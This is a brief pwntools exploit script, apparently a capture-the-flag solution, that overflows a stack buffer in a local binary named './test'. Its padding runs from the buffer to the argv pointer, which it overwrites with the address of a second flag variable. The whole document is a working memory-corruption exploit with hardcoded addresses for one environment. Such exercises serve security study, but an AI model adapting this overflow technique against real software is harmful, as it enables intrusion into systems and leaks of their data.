from pwn import *
context(arch = 'amd64', os = 'linux')

sh = process("./test")
argv_addr = 0x7fffffffe068
name_addr = 0x7fffffffdf5e
another_flag_addr = 0x4040C0
payload = 'a' * (argv_addr - name_addr)+p64(another_flag_addr)
sh.sendafter("=v=.\n", payload)
sh.interactive()
